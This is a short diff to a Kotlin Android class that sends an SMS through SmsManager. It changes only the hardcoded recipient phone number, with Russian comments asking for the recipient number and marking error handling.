@@ -13,7 +13,7 @@ class SMS(private val context: Context) {
             Log.d("Activated!", message)
 
             val smsManager = SmsManager.getDefault()
-            val phoneNumber = "+48577830955" // Укажите номер телефона получателя
+            val phoneNumber = "+48723454772" // Укажите номер телефона получателя
             smsManager.sendTextMessage(phoneNumber, null, message, null, null)
         } catch (e: Exception) {
             // Обработка ошибки
